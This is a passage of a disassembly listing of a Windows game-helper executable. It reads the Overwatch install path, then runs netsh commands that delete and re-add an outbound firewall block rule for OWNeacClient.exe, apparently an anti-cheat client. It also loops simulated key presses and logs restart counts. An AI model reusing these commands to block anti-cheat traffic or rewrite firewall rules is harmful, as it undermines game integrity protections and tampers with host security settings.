0000000140003783  mov      qword ptr [rsp + 0x40], rax                     
0000000140003788  call     qword ptr [rip + 0x4dc2]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
000000014000378e  lea      ebx, [rax + 0x1f018]                            
0000000140003794  call     qword ptr [rip + 0x4db6]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
000000014000379a  mov      esi, eax                                        
000000014000379c  call     qword ptr [rip + 0x4dae]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
00000001400037a2  add      eax, 0x1d4c0                                     ; 0x1d4c0
00000001400037a7  xor      edi, edi                                        
00000001400037a9  mov      dword ptr [rip + 0x8ac1], eax                    ; 0x14000c270
00000001400037af  lea      rcx, [rdi - 4]                                  
00000001400037b3  call     qword ptr [rip + 0x4b6f]                         ; 0x140008328 USER32.dll!SetThreadDpiAwarenessContext
00000001400037b9  xor      ecx, ecx                                        
00000001400037bb  call     qword ptr [rip + 0x4d97]                         ; 0x140008558 api-ms-win-crt-time-l1-1-0.dll!_time64
00000001400037c1  mov      rcx, rax                                        
00000001400037c4  call     qword ptr [rip + 0x4da6]                         ; 0x140008570 api-ms-win-crt-utility-l1-1-0.dll!srand
00000001400037ca  cmp      byte ptr [rip + 0x8a64], dil                     ; 0x14000c235
00000001400037d1  jne      0x140003935                                      ; 0x140003935
00000001400037d7  lea      ebp, [rdi + 0x14]                               
00000001400037da  mov      eax, dword ptr [rip + 0x8a94]                    ; 0x14000c274
00000001400037e0  cmp      eax, 1                                           ; 0x1
00000001400037e3  jne      0x1400037ef                                      ; 0x1400037ef
00000001400037e5  call     0x140002cc4                                      ; 0x140002cc4
00000001400037ea  jmp      0x14000391d                                      ; 0x14000391d
00000001400037ef  cmp      eax, 2                                           ; 0x2
00000001400037f2  jne      0x140003823                                      ; 0x140003823
00000001400037f4  mov      edx, ebp                                        
00000001400037f6  mov      cl, 0xa0                                         ; 0xa0
00000001400037f8  call     0x140001774                                      ; 0x140001774
00000001400037fd  mov      edx, ebp                                        
00000001400037ff  mov      cl, 0x20                                         ; 0x20
0000000140003801  call     0x140001774                                      ; 0x140001774
0000000140003806  mov      ecx, 0x3e8                                       ; 0x3e8
000000014000380b  call     0x1400026ec                                      ; 0x1400026ec
0000000140003810  mov      edx, ebp                                        
0000000140003812  mov      cl, 0x57                                         ; 0x57
0000000140003814  call     0x140001774                                      ; 0x140001774
0000000140003819  mov      ecx, 0x3e8                                       ; 0x3e8
000000014000381e  jmp      0x140003918                                      ; 0x140003918
0000000140003823  cmp      eax, 3                                           ; 0x3
0000000140003826  jne      0x14000385b                                      ; 0x14000385b
0000000140003828  xor      r8d, r8d                                        
000000014000382b  xorps    xmm1, xmm1                                      
000000014000382e  xorps    xmm0, xmm0                                      
0000000140003831  call     0x1400015ac                                      ; 0x1400015ac
0000000140003836  mov      r8b, 1                                           ; 0x1
0000000140003839  xorps    xmm1, xmm1                                      
000000014000383c  xorps    xmm0, xmm0                                      
000000014000383f  call     0x1400015ac                                      ; 0x1400015ac
0000000140003844  mov      edx, ebp                                        
0000000140003846  mov      cl, 0x51                                         ; 0x51
0000000140003848  call     0x140001774                                      ; 0x140001774
000000014000384d  mov      edx, ebp                                        
000000014000384f  mov      cl, 0xa0                                         ; 0xa0
0000000140003851  call     0x140001774                                      ; 0x140001774
0000000140003856  jmp      0x140003913                                      ; 0x140003913
000000014000385b  cmp      eax, 4                                           ; 0x4
000000014000385e  jne      0x14000391d                                      ; 0x14000391d
0000000140003864  call     0x14000231c                                      ; 0x14000231c
0000000140003869  call     0x140002c28                                      ; 0x140002c28
000000014000386e  test     al, al                                          
0000000140003870  je       0x14000387e                                      ; 0x14000387e
0000000140003872  call     qword ptr [rip + 0x4cd8]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
0000000140003878  lea      ebx, [rax + 0x1f018]                            
000000014000387e  call     0x140002360                                      ; 0x140002360
0000000140003883  call     qword ptr [rip + 0x4cc7]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
0000000140003889  cmp      eax, ebx                                        
000000014000388b  jle      0x1400038d7                                      ; 0x1400038d7
000000014000388d  mov      edx, ebp                                        
000000014000388f  mov      cl, 0x71                                         ; 0x71
0000000140003891  call     0x140001774                                      ; 0x140001774
0000000140003896  call     qword ptr [rip + 0x4cb4]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
000000014000389c  inc      edi                                             
000000014000389e  lea      ebx, [rax + 0x1f018]                            
00000001400038a4  call     qword ptr [rip + 0x4ca6]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
00000001400038aa  mov      edx, edi                                        
00000001400038ac  lea      rcx, [rip + 0x5275]                              ; 0x140008b28 "重开次数：%d 间隔时间：%.2f"
00000001400038b3  sub      eax, esi                                        
00000001400038b5  movd     xmm2, eax                                       
00000001400038b9  cvtdq2pd xmm2, xmm2                                      
00000001400038bd  divsd    xmm2, qword ptr [rip + 0x5ad3]                   ; 0x140009398
00000001400038c5  movq     r8, xmm2                                        
00000001400038ca  call     0x140001474                                      ; 0x140001474
00000001400038cf  call     qword ptr [rip + 0x4c7b]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
00000001400038d5  mov      esi, eax                                        
00000001400038d7  call     qword ptr [rip + 0x4c73]                         ; 0x140008550 api-ms-win-crt-time-l1-1-0.dll!clock
00000001400038dd  mov      ecx, ebx                                        
00000001400038df  mov      r9d, edi                                        
00000001400038e2  sub      ecx, eax                                        
00000001400038e4  mov      eax, 0x10624dd3                                  ; 0x10624dd3
00000001400038e9  imul     ecx                                             
00000001400038eb  lea      rcx, [rsp + 0x20]                               
00000001400038f0  sar      edx, 6                                           ; 0x6
00000001400038f3  mov      r8d, edx                                        
00000001400038f6  shr      r8d, 0x1f                                        ; 0x1f
00000001400038fa  add      r8d, edx                                        
00000001400038fd  lea      rdx, [rip + 0x5244]                              ; 0x140008b48 "%d 秒 次数：%d"
0000000140003904  call     0x140004678                                      ; 0x140004678
0000000140003909  lea      rcx, [rsp + 0x20]                               
000000014000390e  call     0x1400012f4                                      ; 0x1400012f4
0000000140003913  mov      ecx, 0x1f4                                       ; 0x1f4
0000000140003918  call     0x1400026ec                                      ; 0x1400026ec
000000014000391d  mov      ecx, 0xf                                         ; 0xf
0000000140003922  call     qword ptr [rip + 0x4898]                         ; 0x1400081c0 KERNEL32.DLL!Sleep
0000000140003928  cmp      byte ptr [rip + 0x8906], 0                       ; 0x14000c235 | 0x0
000000014000392f  je       0x1400037da                                      ; 0x1400037da
0000000140003935  xor      eax, eax                                        
0000000140003937  mov      rcx, qword ptr [rsp + 0x40]                     
000000014000393c  xor      rcx, rsp                                        
000000014000393f  call     0x1400062f0                                      ; 0x1400062f0
0000000140003944  add      rsp, 0x58                                        ; 0x58
0000000140003948  pop      rdi                                             
0000000140003949  pop      rsi                                             
000000014000394a  pop      rbp                                             
000000014000394b  pop      rbx                                             
000000014000394c  ret                                                      
000000014000394d  int3                                                     
000000014000394e  int3                                                     
000000014000394f  int3                                                     

; FUNCTION 0x140003950

0000000140003950  mov      qword ptr [rsp + 0x18], rbx                     
0000000140003955  push     rbp                                             
0000000140003956  push     rsi                                             
0000000140003957  push     rdi                                             
0000000140003958  push     r12                                             
000000014000395a  push     r13                                             
000000014000395c  push     r14                                             
000000014000395e  push     r15                                             
0000000140003960  lea      rbp, [rsp - 0x460]                              
0000000140003968  sub      rsp, 0x560                                       ; 0x560
000000014000396f  mov      rax, qword ptr [rip + 0x86ca]                    ; 0x14000c040
0000000140003976  xor      rax, rsp                                        
0000000140003979  mov      qword ptr [rbp + 0x450], rax                    
0000000140003980  mov      rdi, rdx                                        
0000000140003983  mov      rbx, rcx                                        
0000000140003986  xor      r15d, r15d                                      
0000000140003989  mov      rcx, qword ptr [rcx + 0x10]                     
000000014000398d  movabs   r14, 0x7fffffffffffffff                          ; 0x7fffffffffffffff
0000000140003997  mov      rax, r14                                        
000000014000399a  sub      rax, rcx                                        
000000014000399d  cmp      rax, 0x7e                                        ; 0x7e
00000001400039a1  jb       0x140003d32                                      ; 0x140003d32
00000001400039a7  mov      rax, rbx                                        
00000001400039aa  cmp      qword ptr [rbx + 0x18], 0xf                      ; 0xf
00000001400039af  jbe      0x1400039b4                                      ; 0x1400039b4
00000001400039b1  mov      rax, qword ptr [rbx]                            
00000001400039b4  mov      qword ptr [rsp + 0x30], rcx                     
00000001400039b9  mov      qword ptr [rsp + 0x28], rax                     
00000001400039be  mov      qword ptr [rsp + 0x20], 0x7e                     ; 0x7e
00000001400039c7  lea      r9, [rip + 0x51e2]                               ; 0x140008bb0 "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\FirewallRules\" /s | findstr /i \"Name="
00000001400039ce  lea      rcx, [rbp - 0x58]                               
00000001400039d2  call     0x140004ffc                                      ; 0x140004ffc
00000001400039d7  nop                                                      
00000001400039d8  mov      r8d, 1                                           ; 0x1
00000001400039de  lea      rdx, [rip + 0x51bf]                              ; 0x140008ba4
00000001400039e5  lea      rcx, [rbp - 0x58]                               
00000001400039e9  call     0x140004e10                                      ; 0x140004e10
00000001400039ee  xorps    xmm0, xmm0                                      
00000001400039f1  movups   xmmword ptr [rbp + 8], xmm0                     
00000001400039f5  xorps    xmm1, xmm1                                      
00000001400039f8  movdqu   xmmword ptr [rbp + 0x18], xmm1                  
00000001400039fd  movups   xmm0, xmmword ptr [rax]                         
0000000140003a00  movups   xmmword ptr [rbp + 8], xmm0                     
0000000140003a04  movups   xmm1, xmmword ptr [rax + 0x10]                  
0000000140003a08  movups   xmmword ptr [rbp + 0x18], xmm1                  
0000000140003a0c  mov      byte ptr [rax], r15b                            
0000000140003a0f  mov      qword ptr [rax + 0x10], r15                     
0000000140003a13  mov      qword ptr [rax + 0x18], 0xf                      ; 0xf
0000000140003a1b  lea      rcx, [rbp - 0x58]                               
0000000140003a1f  call     0x140004b70                                      ; 0x140004b70
0000000140003a24  lea      rcx, [rbp + 8]                                  
0000000140003a28  cmp      qword ptr [rbp + 0x20], 0xf                      ; 0xf
0000000140003a2d  cmova    rcx, qword ptr [rbp + 8]                        
0000000140003a32  lea      rdx, [rip + 0x51f7]                              ; 0x140008c30
0000000140003a39  call     qword ptr [rip + 0x4ab9]                         ; 0x1400084f8 api-ms-win-crt-stdio-l1-1-0.dll!_popen
0000000140003a3f  mov      r13, rax                                        
0000000140003a42  test     rax, rax                                        
0000000140003a45  je       0x140003cf9                                      ; 0x140003cf9
0000000140003a4b  mov      esi, r15d                                       
0000000140003a4e  jmp      0x140003aa2                                      ; 0x140003aa2
0000000140003a50  cmp      qword ptr [rdi + 0x18], 0xf                      ; 0xf
0000000140003a55  jbe      0x140003a5c                                      ; 0x140003a5c
0000000140003a57  mov      rsi, qword ptr [rdi]                            
0000000140003a5a  jmp      0x140003a5f                                      ; 0x140003a5f
0000000140003a5c  mov      rsi, rdi                                        
0000000140003a5f  test     rsi, rsi                                        
0000000140003a62  je       0x140003a9d                                      ; 0x140003a9d
0000000140003a64  mov      rcx, rsi                                        
0000000140003a67  call     0x140007220                                      ; 0x140007220
0000000140003a6c  mov      r12, rax                                        
0000000140003a6f  test     rax, rax                                        
0000000140003a72  je       0x140003abe                                      ; 0x140003abe
0000000140003a74  lea      r15, [rbp + 0x50]                               
0000000140003a78  cmp      byte ptr [rbp + 0x50], 0                         ; 0x0
0000000140003a7c  je       0x140003a9a                                      ; 0x140003a9a
0000000140003a7e  mov      r8, r12                                         
0000000140003a81  mov      rdx, rsi                                        
0000000140003a84  mov      rcx, r15                                        
0000000140003a87  call     qword ptr [rip + 0x4aab]                         ; 0x140008538 api-ms-win-crt-string-l1-1-0.dll!_strnicmp
0000000140003a8d  test     eax, eax                                        
0000000140003a8f  je       0x140003abb                                      ; 0x140003abb
0000000140003a91  inc      r15                                             
0000000140003a94  cmp      byte ptr [r15], 0                                ; 0x0
0000000140003a98  jne      0x140003a7e                                      ; 0x140003a7e
0000000140003a9a  xor      r15d, r15d                                      
0000000140003a9d  mov      esi, 1                                           ; 0x1
0000000140003aa2  mov      r8, r13                                         
0000000140003aa5  mov      edx, 0x400                                       ; 0x400
0000000140003aaa  lea      rcx, [rbp + 0x50]                               
0000000140003aae  call     qword ptr [rip + 0x4a5c]                         ; 0x140008510 api-ms-win-crt-stdio-l1-1-0.dll!fgets
0000000140003ab4  test     rax, rax                                        
0000000140003ab7  jne      0x140003a50                                      ; 0x140003a50
0000000140003ab9  jmp      0x140003ac3                                      ; 0x140003ac3
0000000140003abb  xor      r15d, r15d                                      
0000000140003abe  mov      esi, 2                                           ; 0x2
0000000140003ac3  mov      rcx, r13                                        
0000000140003ac6  call     qword ptr [rip + 0x4a14]                         ; 0x1400084e0 api-ms-win-crt-stdio-l1-1-0.dll!fclose
0000000140003acc  cmp      esi, 2                                           ; 0x2
0000000140003acf  je       0x140003cf9                                      ; 0x140003cf9
0000000140003ad5  test     esi, esi                                        
0000000140003ad7  je       0x140003b8c                                      ; 0x140003b8c
0000000140003add  mov      rcx, qword ptr [rbx + 0x10]                     
0000000140003ae1  mov      rax, r14                                        
0000000140003ae4  sub      rax, rcx                                        
0000000140003ae7  cmp      rax, 0x2d                                        ; 0x2d
0000000140003aeb  jb       0x140003d38                                      ; 0x140003d38
0000000140003af1  mov      rax, rbx                                        
0000000140003af4  mov      esi, 0xf                                         ; 0xf
0000000140003af9  cmp      qword ptr [rbx + 0x18], rsi                     
0000000140003afd  jbe      0x140003b02                                      ; 0x140003b02
0000000140003aff  mov      rax, qword ptr [rbx]                            
0000000140003b02  mov      qword ptr [rsp + 0x30], rcx                     
0000000140003b07  mov      qword ptr [rsp + 0x28], rax                     
0000000140003b0c  mov      qword ptr [rsp + 0x20], 0x2d                     ; 0x2d
0000000140003b15  lea      r9, [rip + 0x511c]                               ; 0x140008c38 "netsh advfirewall firewall delete rule name=\""
0000000140003b1c  lea      rcx, [rbp - 0x38]                               
0000000140003b20  call     0x140004ffc                                      ; 0x140004ffc
0000000140003b25  nop                                                      
0000000140003b26  mov      r8d, 1                                           ; 0x1
0000000140003b2c  lea      rdx, [rip + 0x5071]                              ; 0x140008ba4
0000000140003b33  lea      rcx, [rbp - 0x38]                               
0000000140003b37  call     0x140004e10                                      ; 0x140004e10
0000000140003b3c  xorps    xmm0, xmm0                                      
0000000140003b3f  movups   xmmword ptr [rbp + 0x28], xmm0                  
0000000140003b43  xorps    xmm1, xmm1                                      
0000000140003b46  movdqu   xmmword ptr [rbp + 0x38], xmm1                  
0000000140003b4b  movups   xmm0, xmmword ptr [rax]                         
0000000140003b4e  movups   xmmword ptr [rbp + 0x28], xmm0                  
0000000140003b52  movups   xmm1, xmmword ptr [rax + 0x10]                  
0000000140003b56  movups   xmmword ptr [rbp + 0x38], xmm1                  
0000000140003b5a  mov      byte ptr [rax], r15b                            
0000000140003b5d  mov      qword ptr [rax + 0x10], r15                     
0000000140003b61  mov      qword ptr [rax + 0x18], rsi                     
0000000140003b65  lea      rcx, [rbp - 0x38]                               
0000000140003b69  call     0x140004b70                                      ; 0x140004b70
0000000140003b6e  lea      rcx, [rbp + 0x28]                               
0000000140003b72  cmp      qword ptr [rbp + 0x40], rsi                     
0000000140003b76  cmova    rcx, qword ptr [rbp + 0x28]                     
0000000140003b7b  call     qword ptr [rip + 0x4917]                         ; 0x140008498 api-ms-win-crt-runtime-l1-1-0.dll!system
0000000140003b81  lea      rcx, [rbp + 0x28]                               
0000000140003b85  call     0x140004b70                                      ; 0x140004b70
0000000140003b8a  jmp      0x140003b91                                      ; 0x140003b91
0000000140003b8c  mov      esi, 0xf                                         ; 0xf
0000000140003b91  mov      rax, qword ptr [rbx + 0x10]                     
0000000140003b95  sub      r14, rax                                        
0000000140003b98  cmp      r14, 0x2a                                        ; 0x2a
0000000140003b9c  jb       0x140003d2c                                      ; 0x140003d2c
0000000140003ba2  cmp      qword ptr [rbx + 0x18], rsi                     
0000000140003ba6  jbe      0x140003bab                                      ; 0x140003bab
0000000140003ba8  mov      rbx, qword ptr [rbx]                            
0000000140003bab  mov      qword ptr [rsp + 0x30], rax                     
0000000140003bb0  mov      qword ptr [rsp + 0x28], rbx                     
0000000140003bb5  mov      qword ptr [rsp + 0x20], 0x2a                     ; 0x2a
0000000140003bbe  lea      r9, [rip + 0x50cb]                               ; 0x140008c90 "netsh advfirewall firewall add rule name=\""
0000000140003bc5  lea      rcx, [rbp - 0x18]                               
0000000140003bc9  call     0x140004ffc                                      ; 0x140004ffc
0000000140003bce  nop                                                      
0000000140003bcf  mov      r8d, 0xb                                         ; 0xb
0000000140003bd5  lea      rdx, [rip + 0x50a4]                              ; 0x140008c80 "\" program=\""
0000000140003bdc  lea      rcx, [rbp - 0x18]                               
0000000140003be0  call     0x140004e10                                      ; 0x140004e10
0000000140003be5  xorps    xmm0, xmm0                                      
0000000140003be8  movups   xmmword ptr [rsp + 0x68], xmm0                  
0000000140003bed  xorps    xmm1, xmm1                                      
0000000140003bf0  movdqu   xmmword ptr [rsp + 0x78], xmm1                  
0000000140003bf6  movups   xmm0, xmmword ptr [rax]                         
0000000140003bf9  movups   xmmword ptr [rsp + 0x68], xmm0                  
0000000140003bfe  movups   xmm1, xmmword ptr [rax + 0x10]                  
0000000140003c02  movups   xmmword ptr [rsp + 0x78], xmm1                  
0000000140003c07  mov      byte ptr [rax], r15b                            
0000000140003c0a  mov      qword ptr [rax + 0x10], r15                     
0000000140003c0e  mov      qword ptr [rax + 0x18], rsi                     
0000000140003c12  mov      rdx, rdi                                        
0000000140003c15  cmp      qword ptr [rdi + 0x18], rsi                     
0000000140003c19  jbe      0x140003c1e                                      ; 0x140003c1e
0000000140003c1b  mov      rdx, qword ptr [rdi]                            
0000000140003c1e  mov      r8, qword ptr [rdi + 0x10]                      
0000000140003c22  lea      rcx, [rsp + 0x68]                               
0000000140003c27  call     0x140004e10                                      ; 0x140004e10
0000000140003c2c  xorps    xmm0, xmm0                                      
0000000140003c2f  movups   xmmword ptr [rsp + 0x48], xmm0                  
0000000140003c34  xorps    xmm1, xmm1                                      
0000000140003c37  movdqu   xmmword ptr [rsp + 0x58], xmm1                  
0000000140003c3d  movups   xmm0, xmmword ptr [rax]                         
0000000140003c40  movups   xmmword ptr [rsp + 0x48], xmm0                  
0000000140003c45  movups   xmm1, xmmword ptr [rax + 0x10]                  
0000000140003c49  movups   xmmword ptr [rsp + 0x58], xmm1                  
0000000140003c4e  mov      byte ptr [rax], r15b                            
0000000140003c51  mov      qword ptr [rax + 0x10], r15                     
0000000140003c55  mov      qword ptr [rax + 0x18], rsi                     
0000000140003c59  mov      r8d, 0x16                                        ; 0x16
0000000140003c5f  lea      rdx, [rip + 0x5002]                              ; 0x140008c68 "\" dir=out action=block"
0000000140003c66  lea      rcx, [rsp + 0x48]                               
0000000140003c6b  call     0x140004e10                                      ; 0x140004e10
0000000140003c70  movups   xmm0, xmmword ptr [rax]                         
0000000140003c73  movups   xmmword ptr [rbp - 0x78], xmm0                  
0000000140003c77  movups   xmm1, xmmword ptr [rax + 0x10]                  
0000000140003c7b  movups   xmmword ptr [rbp - 0x68], xmm1                  
0000000140003c7f  mov      byte ptr [rax], r15b                            
0000000140003c82  mov      qword ptr [rax + 0x10], r15                     
0000000140003c86  mov      qword ptr [rax + 0x18], rsi                     
0000000140003c8a  lea      rdx, [rbp - 0x78]                               
0000000140003c8e  lea      rcx, [rbp + 8]                                  
0000000140003c92  call     0x140004bd8                                      ; 0x140004bd8
0000000140003c97  lea      rcx, [rbp - 0x78]                               
0000000140003c9b  call     0x140004b70                                      ; 0x140004b70
0000000140003ca0  nop                                                      
0000000140003ca1  lea      rcx, [rsp + 0x48]                               
0000000140003ca6  call     0x140004b70                                      ; 0x140004b70
0000000140003cab  nop                                                      
0000000140003cac  lea      rcx, [rsp + 0x68]                               
0000000140003cb1  call     0x140004b70                                      ; 0x140004b70
0000000140003cb6  nop                                                      
0000000140003cb7  lea      rcx, [rbp - 0x18]                               
0000000140003cbb  call     0x140004b70                                      ; 0x140004b70
0000000140003cc0  lea      rcx, [rbp + 8]                                  
0000000140003cc4  cmp      qword ptr [rbp + 0x20], rsi                     
0000000140003cc8  cmova    rcx, qword ptr [rbp + 8]                        
0000000140003ccd  call     qword ptr [rip + 0x47c5]                         ; 0x140008498 api-ms-win-crt-runtime-l1-1-0.dll!system
0000000140003cd3  lea      rcx, [rip + 0x4fe6]                              ; 0x140008cc0 "netsh advfirewall set allprofiles state on"
0000000140003cda  call     qword ptr [rip + 0x47b8]                         ; 0x140008498 api-ms-win-crt-runtime-l1-1-0.dll!system
0000000140003ce0  cmp      qword ptr [rdi + 0x18], rsi                     
0000000140003ce4  jbe      0x140003ce9                                      ; 0x140003ce9
0000000140003ce6  mov      rdi, qword ptr [rdi]                            
0000000140003ce9  mov      rdx, rdi                                        
0000000140003cec  lea      rcx, [rip + 0x4ffd]                              ; 0x140008cf0 "添加规则：%s"
0000000140003cf3  call     0x140001474                                      ; 0x140001474
0000000140003cf8  nop                                                      
0000000140003cf9  lea      rcx, [rbp + 8]                                  
0000000140003cfd  call     0x140004b70                                      ; 0x140004b70
0000000140003d02  mov      rcx, qword ptr [rbp + 0x450]                    
0000000140003d09  xor      rcx, rsp                                        
0000000140003d0c  call     0x1400062f0                                      ; 0x1400062f0
0000000140003d11  mov      rbx, qword ptr [rsp + 0x5b0]                    
0000000140003d19  add      rsp, 0x560                                       ; 0x560
0000000140003d20  pop      r15                                             
0000000140003d22  pop      r14                                             
0000000140003d24  pop      r13                                             
0000000140003d26  pop      r12                                             
0000000140003d28  pop      rdi                                             
0000000140003d29  pop      rsi                                             
0000000140003d2a  pop      rbp                                             
0000000140003d2b  ret                                                      
0000000140003d2c  call     0x140001230                                      ; 0x140001230
0000000140003d31  nop                                                      
0000000140003d32  call     0x140001230                                      ; 0x140001230
0000000140003d37  nop                                                      
0000000140003d38  call     0x140001230                                      ; 0x140001230
0000000140003d3d  int3                                                     
0000000140003d3e  int3                                                     
0000000140003d3f  int3                                                     

; FUNCTION 0x140003d40

0000000140003d40  mov      qword ptr [rsp + 8], rbx                        
0000000140003d45  push     rbp                                             
0000000140003d46  lea      rbp, [rsp - 0x57]                               
0000000140003d4b  sub      rsp, 0xd0                                        ; 0xd0
0000000140003d52  mov      rax, qword ptr [rip + 0x82e7]                    ; 0x14000c040
0000000140003d59  xor      rax, rsp                                        
0000000140003d5c  mov      qword ptr [rbp + 0x47], rax                     
0000000140003d60  lea      rdx, [rip + 0x4f99]                              ; 0x140008d00 "667546138"
0000000140003d67  lea      rcx, [rbp + 0x27]                               
0000000140003d6b  call     0x140004c6c                                      ; 0x140004c6c
0000000140003d70  nop                                                      
0000000140003d71  lea      rdx, [rip + 0x4f98]                              ; 0x140008d10 "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Overwatch"
0000000140003d78  lea      rcx, [rbp + 7]                                  
0000000140003d7c  call     0x140004c6c                                      ; 0x140004c6c
0000000140003d81  nop                                                      
0000000140003d82  lea      rdx, [rip + 0x4fd7]                              ; 0x140008d60 "InstallLocation"
0000000140003d89  lea      rcx, [rbp - 0x19]                               
0000000140003d8d  call     0x140004c6c                                      ; 0x140004c6c
0000000140003d92  nop                                                      
0000000140003d93  xorps    xmm0, xmm0                                      
0000000140003d96  movups   xmmword ptr [rbp - 0x39], xmm0                  
0000000140003d9a  mov      qword ptr [rbp - 0x29], 0                        ; 0x0
0000000140003da2  mov      qword ptr [rbp - 0x21], 0xf                      ; 0xf
0000000140003daa  mov      byte ptr [rbp - 0x39], 0                         ; 0x0
0000000140003dae  lea      rdx, [rbp + 7]                                  
0000000140003db2  cmp      qword ptr [rbp + 0x1f], 0xf                      ; 0xf
0000000140003db7  cmova    rdx, qword ptr [rbp + 7]                        
0000000140003dbc  lea      rax, [rbp - 0x41]                               
0000000140003dc0  mov      qword ptr [rsp + 0x20], rax                     
0000000140003dc5  mov      r9d, 0x20019                                     ; 0x20019
0000000140003dcb  xor      r8d, r8d                                        
0000000140003dce  mov      rcx, 0xffffffff80000002                          ; -0x7ffffffe
0000000140003dd5  call     qword ptr [rip + 0x422d]                         ; 0x140008008 ADVAPI32.dll!RegOpenKeyExA
0000000140003ddb  test     eax, eax                                        
0000000140003ddd  jne      0x140003eae                                      ; 0x140003eae
0000000140003de3  mov      dword ptr [rbp - 0x49], eax                     
0000000140003de6  lea      rdx, [rbp - 0x19]                               
0000000140003dea  cmp      qword ptr [rbp - 1], 0xf                         ; 0xf
0000000140003def  cmova    rdx, qword ptr [rbp - 0x19]                     
0000000140003df4  lea      rax, [rbp - 0x49]                               
0000000140003df8  mov      qword ptr [rsp + 0x28], rax                     
0000000140003dfd  mov      qword ptr [rsp + 0x20], 0                        ; 0x0
0000000140003e06  xor      r9d, r9d                                        
0000000140003e09  xor      r8d, r8d                                        
0000000140003e0c  mov      rcx, qword ptr [rbp - 0x41]                     
0000000140003e10  call     qword ptr [rip + 0x41ea]                         ; 0x140008000 ADVAPI32.dll!RegQueryValueExA
0000000140003e16  test     eax, eax                                        
0000000140003e18  jne      0x140003ea4                                      ; 0x140003ea4
0000000140003e1e  mov      ecx, dword ptr [rbp - 0x49]                     
0000000140003e21  call     0x140006380                                      ; 0x140006380
0000000140003e26  mov      rbx, rax                                        
0000000140003e29  lea      rdx, [rbp - 0x19]                               
0000000140003e2d  cmp      qword ptr [rbp - 1], 0xf                         ; 0xf
0000000140003e32  cmova    rdx, qword ptr [rbp - 0x19]                     
0000000140003e37  lea      rax, [rbp - 0x49]                               
0000000140003e3b  mov      qword ptr [rsp + 0x28], rax                     
0000000140003e40  mov      qword ptr [rsp + 0x20], rbx                     
0000000140003e45  xor      r9d, r9d                                        
0000000140003e48  xor      r8d, r8d                                        
0000000140003e4b  mov      rcx, qword ptr [rbp - 0x41]                     
0000000140003e4f  call     qword ptr [rip + 0x41ab]                         ; 0x140008000 ADVAPI32.dll!RegQueryValueExA
0000000140003e55  test     eax, eax                                        
0000000140003e57  jne      0x140003e9c                                      ; 0x140003e9c
0000000140003e59  mov      rdx, rbx                                        
0000000140003e5c  lea      rcx, [rbp - 0x39]                               
0000000140003e60  call     0x140004a0c                                      ; 0x140004a0c
0000000140003e65  mov      rcx, rbx                                        
0000000140003e68  call     0x140006310                                      ; 0x140006310
0000000140003e6d  mov      rcx, qword ptr [rbp - 0x41]                     
0000000140003e71  call     qword ptr [rip + 0x4199]                         ; 0x140008010 ADVAPI32.dll!RegCloseKey
0000000140003e77  mov      r8d, 0x1a                                        ; 0x1a
0000000140003e7d  lea      rdx, [rip + 0x4eec]                              ; 0x140008d70 "\\_retail_\\OWNeacClient.exe"
0000000140003e84  lea      rcx, [rbp - 0x39]                               
0000000140003e88  call     0x140004e10                                      ; 0x140004e10
0000000140003e8d  lea      rdx, [rbp - 0x39]                               
0000000140003e91  lea      rcx, [rbp + 0x27]                               
0000000140003e95  call     0x140003950                                      ; 0x140003950
0000000140003e9a  jmp      0x140003ebb                                      ; 0x140003ebb
0000000140003e9c  mov      rcx, rbx                                        
0000000140003e9f  call     0x140006310                                      ; 0x140006310
0000000140003ea4  mov      rcx, qword ptr [rbp - 0x41]                     
0000000140003ea8  call     qword ptr [rip + 0x4162]                         ; 0x140008010 ADVAPI32.dll!RegCloseKey
0000000140003eae  lea      rcx, [rip + 0x4edb]                              ; 0x140008d90 "无法获取安装路径。"
0000000140003eb5  call     0x140001474                                      ; 0x140001474
0000000140003eba  nop                                                      
0000000140003ebb  lea      rcx, [rbp - 0x39]                               
0000000140003ebf  call     0x140004b70                                      ; 0x140004b70
0000000140003ec4  nop                                                      
0000000140003ec5  lea      rcx, [rbp - 0x19]                               
0000000140003ec9  call     0x140004b70                                      ; 0x140004b70
0000000140003ece  nop                                                      
0000000140003ecf  lea      rcx, [rbp + 7]                                  
0000000140003ed3  call     0x140004b70                                      ; 0x140004b70
0000000140003ed8  nop                                                      
0000000140003ed9  lea      rcx, [rbp + 0x27]                               
0000000140003edd  call     0x140004b70                                      ; 0x140004b70
0000000140003ee2  mov      rcx, qword ptr [rbp + 0x47]                     
0000000140003ee6  xor      rcx, rsp                                        
0000000140003ee9  call     0x1400062f0                                      ; 0x1400062f0
0000000140003eee  mov      rbx, qword ptr [rsp + 0xe0]                     
0000000140003ef6  add      rsp, 0xd0                                        ; 0xd0
0000000140003efd  pop      rbp                                             
0000000140003efe  ret                                                      
0000000140003eff  int3                                                     

; FUNCTION 0x140003f00

0000000140003f00  mov      qword ptr [rsp + 8], rbx                        
0000000140003f05  mov      qword ptr [rsp + 0x18], rsi                     
0000000140003f0a  push     rbp                                             
0000000140003f0b  push     rdi                                             
0000000140003f0c  push     r12                                             
0000000140003f0e  push     r13                                             
0000000140003f10  push     r14                                             
0000000140003f12  lea      rbp, [rsp - 0xe0]                               
0000000140003f1a  sub      rsp, 0x1e0                                       ; 0x1e0
0000000140003f21  mov      rax, qword ptr [rip + 0x8118]                    ; 0x14000c040
0000000140003f28  xor      rax, rsp                                        
0000000140003f2b  mov      qword ptr [rbp + 0xd0], rax                     
0000000140003f32  mov      rdi, rdx                                        
0000000140003f35  mov      ebx, ecx                                        
0000000140003f37  xor      r14d, r14d                                      
0000000140003f3a  test     ecx, ecx                                        
0000000140003f3c  je       0x140003f7f                                      ; 0x140003f7f
0000000140003f3e  mov      esi, 0x104                                       ; 0x104
0000000140003f43  mov      r8d, esi                                        
0000000140003f46  xor      edx, edx                                        
0000000140003f48  lea      rcx, [rbp - 0x40]                               
0000000140003f4c  call     0x140007214                                      ; 0x140007214
0000000140003f51  mov      r8d, esi                                        
